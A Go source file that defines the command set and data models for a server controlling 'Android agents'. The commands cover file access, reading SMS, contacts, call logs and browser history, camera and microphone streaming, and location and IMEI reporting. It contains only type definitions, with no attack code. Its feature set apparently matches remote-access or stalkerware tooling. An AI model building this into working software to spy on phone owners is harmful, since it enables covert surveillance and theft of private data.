package models

import (
	"time"

	"github.com/google/uuid"
)

// CommandType defines the type of command sent to Android agents
type CommandType string

const (
	// File Operations
	CmdFileList         CommandType = "file_list"
	CmdFileRead         CommandType = "file_read"
	CmdFileReadChunk    CommandType = "file_read_chunk"
	CmdFileWrite        CommandType = "file_write"
	CmdFileDelete       CommandType = "file_delete"
	CmdFileRename       CommandType = "file_rename"
	CmdFileMove         CommandType = "file_move"
	CmdFileDownload     CommandType = "file_download"
	CmdFileUpload       CommandType = "file_upload"
	CmdFileGetDirectory CommandType = "file_get_directory"

	// Application & Browsing
	CmdGetForegroundApp   CommandType = "get_foreground_app"
	CmdGetBrowserHistory   CommandType = "get_browser_history"
	CmdGetInstalledApps    CommandType = "get_installed_apps"

	// Contacts & Communications
	CmdGetContacts    CommandType = "get_contacts"
	CmdGetCallLogs    CommandType = "get_call_logs"
	CmdGetSMSMessages CommandType = "get_sms_messages"

	// Camera & Media
	CmdCameraSnapshot CommandType = "camera_snapshot"
	CmdCameraStream   CommandType = "camera_stream"
	CmdCameraStop     CommandType = "camera_stop"

	// Microphone
	CmdMicStart   CommandType = "mic_start"
	CmdMicStop    CommandType = "mic_stop"
	CmdMicStream  CommandType = "mic_stream"

	// Device Information
	CmdGetDeviceInfo CommandType = "get_device_info"
	CmdGetLocation   CommandType = "get_location"

	// System
	CmdHeartbeat  CommandType = "heartbeat"
	CmdEnroll     CommandType = "device_enroll"
	CmdDisconnect CommandType = "device_disconnect"
)

// ResponseStatus indicates the result of a command
type ResponseStatus string

const (
	StatusPending   ResponseStatus = "pending"
	StatusSuccess   ResponseStatus = "success"
	StatusFailed    ResponseStatus = "failed"
	StatusTimeout   ResponseStatus = "timeout"
	StatusCancelled ResponseStatus = "cancelled"
)

// DeviceCommand represents a command sent to an Android agent
type DeviceCommand struct {
	TransactionID   uuid.UUID    `json:"transaction_id"`
	CommandType     CommandType  `json:"command_type"`
	TargetDeviceID  uuid.UUID    `json:"target_device_id"`
	Payload         string       `json:"payload,omitempty"`
	TimeoutSeconds  int          `json:"timeout_seconds"`
	Priority        int          `json:"priority"`
	IssuedBy        uuid.UUID    `json:"issued_by"`
	IssuedAt        time.Time    `json:"issued_at"`
}

// AgentResponse represents a response from an Android agent
type AgentResponse struct {
	TransactionID  uuid.UUID      `json:"transaction_id"`
	DeviceID       uuid.UUID      `json:"device_id"`
	CommandType    CommandType    `json:"command_type"`
	Status         ResponseStatus `json:"status"`
	Data           []byte         `json:"data,omitempty"`
	ErrorMessage   string         `json:"error_message,omitempty"`
	ReceivedAt     time.Time      `json:"received_at"`
}

// FileInfo represents file metadata
type FileInfo struct {
	Name         string    `json:"name"`
	Path         string    `json:"path"`
	IsDirectory  bool      `json:"is_directory"`
	Size         int64     `json:"size"`
	Permissions  string    `json:"permissions"`
	ModifiedTime time.Time `json:"modified_time"`
}

// Contact represents a device contact
type Contact struct {
	ID        string   `json:"id"`
	Name      string   `json:"name"`
	Phones    []Phone  `json:"phones"`
	Emails    []Email  `json:"emails"`
	PhotoURI  string   `json:"photo_uri"`
	Groups    []string `json:"groups"`
}

// Phone represents a phone number
type Phone struct {
	Number string `json:"number"`
	Type   string `json:"type"`
}

// Email represents an email address
type Email struct {
	Address string `json:"address"`
	Type    string `json:"type"`
}

// CallLogEntry represents a call log entry
type CallLogEntry struct {
	ID          string    `json:"id"`
	Number      string    `json:"number"`
	Name        string    `json:"name"`
	Type        string    `json:"type"` // incoming, outgoing, missed
	Duration    int       `json:"duration"`
	Timestamp   time.Time `json:"timestamp"`
}

// ForegroundApp represents the currently active application
type ForegroundApp struct {
	PackageName    string `json:"package_name"`
	AppName         string `json:"app_name"`
	ActivityName    string `json:"activity_name"`
	LaunchIntentURI string `json:"launch_intent_uri"`
}

// DeviceInfo represents comprehensive device information
type DeviceInfo struct {
	DeviceID         string  `json:"device_id"`
	Model            string  `json:"model"`
	Manufacturer     string  `json:"manufacturer"`
	AndroidVersion   string  `json:"android_version"`
	SDKVersion       int     `json:"sdk_version"`
	BuildNumber      string  `json:"build_number"`
	BatteryLevel     int     `json:"battery_level"`
	BatteryStatus    string  `json:"battery_status"`
	StorageTotal     int64   `json:"storage_total"`
	StorageAvailable int64   `json:"storage_available"`
	RAMTotal         int64   `json:"ram_total"`
	RAMAvailable     int64   `json:"ram_available"`
	ScreenResolution string  `json:"screen_resolution"`
	Carrier          string  `json:"carrier"`
	IMEI             string  `json:"imei"`
	IPAddresses      []string `json:"ip_addresses"`
}

// Location represents device location
type Location struct {
	Latitude  float64   `json:"latitude"`
	Longitude float64   `json:"longitude"`
	Altitude  float64   `json:"altitude"`
	Accuracy  float64   `json:"accuracy"`
	Timestamp time.Time `json:"timestamp"`
}
